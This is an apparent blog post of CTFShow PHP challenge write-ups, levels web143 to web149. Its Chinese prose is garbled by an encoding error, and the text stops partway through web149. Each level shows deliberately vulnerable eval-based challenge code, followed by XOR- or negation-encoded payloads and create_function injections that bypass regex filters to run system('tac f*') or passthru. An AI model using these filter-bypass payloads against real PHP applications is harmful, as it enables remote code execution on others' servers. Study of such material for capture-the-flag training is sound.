<h2 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-18 12:48:14</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>è§‚å¯Ÿæ­¤é¢˜æ˜¯åœ¨web 141å¾—åŸºç¡€ä¸Šå¯¹è¾“å…¥å¾—å†…å®¹è¿›è¡Œäº†æ›´å¤šå¾—è¿‡æ»¤ã€‚è¿‡æ»¤äº† ~(å–å) -(å‡å·), é‚£ä¹ˆ å–åå°†ä¸èƒ½åˆ©ç”¨å¹¶ä¸”å‡å·ä¸èƒ½åˆ©ç”¨ã€‚ä½†ä»ç„¶å¯ä»¥åˆ©ç”¨ å¼‚æˆ–ï¼Œ* ï¼Œ/ï¼Œéœ€è¦æ›´æ”¹ç”Ÿæˆæ–‡ä»¶å¾—æ­£åˆ™ä¸ºé¢˜ç›®ä¸­çš„ä¸€æ ·ã€‚</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="number">2</span>&amp;v3=/(<span class="string">&quot;%0f%01%0c%0c%0b%08%0d%0a&quot;</span>^<span class="string">&quot;%7f%60%7f%7f%7f%60%7f%7f&quot;</span>)(<span class="string">&quot;%0b%01%03%00%06%00&quot;</span>^<span class="string">&quot;%7f%60%60%20%60%2a&quot;</span>)/</span><br><span class="line"><span class="comment">//v3=system(&#x27;tac f*&#x27;)</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web143.png"></p>
<h2 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-18 16:21:15</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; check(<span class="variable">$v3</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strlen(<span class="variable">$str</span>)===<span class="number">1</span>?<span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>æ­¤é¢˜åœ¨web141çš„åŸºç¡€ä¸Š å®šä¹‰äº†ä¸€ä¸ª checkå‡½æ•°ï¼Œæ­¤å‡½æ•°çš„åŠŸèƒ½æ˜¯ï¼šåˆ¤æ–­ str çš„é•¿åº¦æ˜¯å¦ä¸º1å¹¶ä¸”ç±»å‹æ˜¯å¦ä¸€æ ·ã€‚ä¸‰ç›®è¿ç®—ç¬¦å¯æ”¹å†™ä¸º:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$str</span>) === <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>é‚£ä¹ˆè¿™ä¸ªå‚æ•° é•¿åº¦å¿…é¡»ä¸º 1 ä½ã€‚å…¶ä½™æ²¡ä»€ä¹ˆå˜åŒ–ã€‚</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="number">10</span>&amp;v3=<span class="number">1</span>&amp;v2=/(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">8</span>B%<span class="number">9</span>E%<span class="number">9</span>C%DF%<span class="number">99</span>%D5);</span><br><span class="line"><span class="comment">// v2 = system(&#x27;tac f*&#x27;)</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web144.png"></p>
<h2 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-18 17:41:33</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜è¿‡æ»¤äº†å¾ˆå¤šã€‚å…¶ä¸­å¯¹ -ï¼ˆå‡å·ï¼‰, +(åŠ å·)ï¼Œ*ï¼ˆä¹˜å·ï¼‰ï¼Œ/ï¼ˆé™¤å·ï¼‰ï¼Œ&amp;ï¼ˆå–å€ï¼‰ï¼Œ%ï¼ˆå–æ¨¡ï¼‰è¿™äº›å¸¸è§„çš„ç®—æ•°è¿ç®—ç¬¦å·è¿›è¡Œäº†è¿‡æ»¤ã€‚ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤ | ï¼ˆæˆ–è¿ç®—ï¼‰ã€‚</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="number">2</span>&amp;v3=|(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">8</span>B%<span class="number">9</span>E%<span class="number">9</span>C%DF%<span class="number">99</span>%D5)|</span><br><span class="line"><span class="comment">// v3 = system(&#x27;tac f*&#x27;)</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web145.png"></p>
<ul>
<li>åŸæ¥è¿˜å¯ä»¥ ä¸‰æœ¨è¿ç®—ï¼š1ä¸ºTrue é‚£ä¹ˆè‡ªç„¶ä¼šæ‰§è¡Œæ„é€ çš„è¯­å¥ã€‚</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="number">2</span>&amp;v3=?(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">8</span>B%<span class="number">9</span>E%<span class="number">9</span>C%DF%<span class="number">99</span>%D5):</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>?(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">8</span>B%<span class="number">9</span>E%<span class="number">9</span>C%DF%<span class="number">99</span>%D5):<span class="number">2</span> <span class="comment">// 1ä¸ºTrue é‚£ä¹ˆè‡ªç„¶ä¼šæ‰§è¡Œæ„é€ çš„è¯­å¥ã€‚</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web145_1.png"></p>
<ul>
<li>æ—¢ç„¶ä¸‰æœ¨å¯ä»¥ï¼Œé‚£ä¹ˆ åŸæ¥çš„é‚£å‡ é“åº”è¯¥ä¹Ÿå¯ä»¥ã€‚ç»æµ‹è¯•å¯ä»¥ã€‚</li>
</ul>
<h2 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-18 17:41:33</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>ç›¸è¾ƒäºä¸Šä¸€é¢˜ï¼Œæ²¡æœ‰è¿‡æ»¤ | (æˆ–)ï¼Œè¿‡æ»¤äº† : (å†’å·)ï¼Œé‚£ä¹ˆä¸‰ç›®è¿ç®—å°±å¤±æ•ˆäº†ã€‚</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="number">2</span>&amp;v3=|(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">8</span>B%<span class="number">9</span>E%<span class="number">9</span>C%DF%<span class="number">99</span>%D5)|</span><br><span class="line">v3 = system(<span class="string">&#x27;tac f*&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web146.png"></p>
<h2 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-19 02:04:38</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>create_function()åˆ›å»ºåŒ¿åå‡½æ•°çš„åˆ©ç”¨ã€‚<a href="https://www.php.net/manual/en/function.create-function.php">PHPï¼š create_function - æ‰‹å†Œ</a></li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web147.png">;</p>
<ul>
<li>create_function()çš„ç”¨æ³•</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$fun</span> = create_function(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&#x27;echo &quot;123;&quot;&#x27;</span>);</span><br><span class="line"><span class="comment">// ç›¸å½“äº</span></span><br><span class="line">fun(<span class="variable">$a</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå˜é‡ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºå‡½æ•°ä½“ä¸­çš„å†…å®¹ã€‚</li>
<li>å¯ä»¥å¯¹ å‡½æ•°ä½“çš„å†…å®¹ä½œæ‰‹è„šä¾‹å¦‚: ;}phpinfo();// æˆ–è€… ;}phpinfo();/*</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web147_1.png">;</p>
<ul>
<li>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒæˆåŠŸæ‰§è¡Œ phpinfo(); å› ä¸º ;} å¯¹å‡½æ•°ä½“è¿›è¡Œäº†é—­åˆï¼Œphpinof();å°±æˆä¸ºäº†ä¸€æ¡åç»­è¯­å¥ã€‚è€Œ /* æˆ–è€…// åˆ™ä¸º æ³¨é‡Šæ‰åŸæœ‰çš„ å³å¤§æ‹¬å· }</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">fun(<span class="variable">$a</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line">    ;&#125;phpinfo();<span class="comment">/*</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>åœ¨æœ¬é¢˜å½“ä¸­ æœ‰ä¸¤ä¸ªå¯æ§å‚æ•° ctf, show æˆ‘ä»¬éœ€è¦å¯¹å…¶æ„é€ æˆä¸º create_function() çš„å½¢å¼ä»è€Œè¾¾åˆ°ç›®çš„ã€‚</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post: create_function</span><br><span class="line">get: &#125;passthru(<span class="string">&quot;tac f*&quot;</span>);<span class="comment">/*</span></span><br></pre></td></tr></table></figure>

<ul>
<li>æ­¤æ—¶å¹¶ä¸èƒ½é¡ºåˆ©æ‹¿åˆ° flag å› ä¸ºæ­¤é¢˜è¿˜æœ‰ä¸€ä¸ªè€ƒç‚¹ php namespace å‘½åç©ºé—´ã€‚é»˜è®¤å‘½åç©ºé—´æ˜¯\ï¼Œæ‰€æœ‰åŸç”Ÿå‡½æ•°å’Œç±»éƒ½åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸­ã€‚ æ™®é€šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯ å¾„ï¼› è€Œå¦‚æœå†™\function_name()è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚ å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™ æ³•</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post: \create_function</span><br><span class="line">get: &#125;passthru(<span class="string">&quot;tac f*&quot;</span>);<span class="comment">/*</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web147_2.png"></p>
<h2 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h2><p>æºç :</p>
<p>ä»€ä¹ˆæ˜¯å˜é‡?</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-19 03:52:11</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ctfshow_fl0g</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>çœ‹äº†æç¤ºå’Œåˆ«äººçš„ wp</li>
<li>æ­£åˆ™æ²¡æœ‰å¯¹ ^ å¼‚æˆ–è¿›è¡Œè¿‡æ»¤ã€‚é‚£ä¹ˆå¯ä»¥ä½¿ç”¨ å¼‚æˆ– ç”Ÿæˆè¯­å¥ã€‚å°±å’Œweb141é‚£å‡ é“ç±»ä¼¼ã€‚</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=(<span class="string">&quot;%08%02%08%09%05%0d&quot;</span>^<span class="string">&quot;%7b%7b%7b%7d%60%60&quot;</span>)(<span class="string">&quot;%09%01%03%01%06%02&quot;</span>^<span class="string">&quot;%7d%60%60%21%60%28&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web148.png"></p>
<ul>
<li>é¢˜ç›®æç¤ºä¸­è¯´ ç”¨ä¸­æ–‡ã€‚è¿™å±å®æ²¡æ‡‚ã€‚</li>
</ul>
<h2 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-19 04:34:40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            unlink(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span 